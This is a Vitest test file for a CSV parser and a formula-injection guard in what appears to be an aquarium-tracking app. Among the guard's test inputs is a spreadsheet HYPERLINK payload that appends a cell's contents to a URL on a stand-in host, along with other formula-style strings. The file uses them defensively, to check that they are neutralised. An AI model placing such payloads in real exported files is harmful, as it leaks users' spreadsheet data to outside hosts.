import { describe, expect, it } from 'vitest';
import { parseCsv, safeCell, toCsv, unguardCell } from './csv';

describe('parseCsv', () => {
	it('reads plain rows, one per record, blank ones included', () => {
		expect(parseCsv('Name,Count\nNeon tetra,12\n\nOtocinclus,4\n')).toEqual([
			['Name', 'Count'],
			['Neon tetra', '12'],
			[''],
			['Otocinclus', '4']
		]);
	});

	it('reads quoted cells with commas, quotes and line breaks', () => {
		expect(parseCsv('Name,Notes\r\n"Fluval 307","Rinse ""bio"" media,\r\nmonthly"\r\n')).toEqual([
			['Name', 'Notes'],
			['Fluval 307', 'Rinse "bio" media,\r\nmonthly']
		]);
	});

	it('keeps a quote inside an unquoted cell', () => {
		expect(parseCsv('Name\n12" tank')).toEqual([['Name'], ['12" tank']]);
	});

	it('finds semicolons and tabs from the first line', () => {
		expect(parseCsv('Name;Count\nNeon tetra;12,5')).toEqual([
			['Name', 'Count'],
			['Neon tetra', '12,5']
		]);
		expect(parseCsv('Name\tCount\nNeon tetra\t12')).toEqual([
			['Name', 'Count'],
			['Neon tetra', '12']
		]);
	});

	it('ignores a BOM and keeps empty cells', () => {
		expect(parseCsv('\uFEFFName,Type,Count\nJava fern,,')).toEqual([
			['Name', 'Type', 'Count'],
			['Java fern', '', '']
		]);
	});

	it('reads back what toCsv writes', () => {
		const rows = [
			['Name', 'Notes'],
			['Tidewell C-400', 'Media: "ceramic", sponge\nRinse monthly'],
			['Heater', '']
		];
		expect(parseCsv(toCsv(rows))).toEqual(rows);
	});
});

describe('cells of typed text, for a file opened in a spreadsheet (#221)', () => {
	it('keeps a cell from running as a formula, and leaves numbers and ordinary text alone', () => {
		expect(safeCell('=1+1')).toBe("'=1+1");
		expect(safeCell('+1 fish')).toBe("'+1 fish");
		expect(safeCell('@SUM(A1)')).toBe("'@SUM(A1)");
		expect(safeCell('-cmd')).toBe("'-cmd");
		expect(safeCell('=HYPERLINK("http://x/?"&A1,"x")')).toBe(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`);
		expect(safeCell('-0.5')).toBe('-0.5');
		expect(safeCell('7.2')).toBe('7.2');
		expect(safeCell('Before the water change')).toBe('Before the water change');
		expect(safeCell('')).toBe('');
	});

	it('quotes a bare return, a comma and a quote', () => {
		expect(safeCell('one\rtwo')).toBe('"one\rtwo"');
		expect(safeCell('a, b')).toBe('"a, b"');
		expect(safeCell('say "hi"')).toBe(`"say ""hi"""`);
	});

	it('comes back as it was typed', () => {
		for (const typed of ['=1+1', '+1 fish', '@home', '-cmd', "'quoted'", "it's fine", '-0.5', 'plain']) {
			const [[cell]] = parseCsv(safeCell(typed) + '\n');
			expect(unguardCell(cell)).toBe(typed);
		}
	});
});
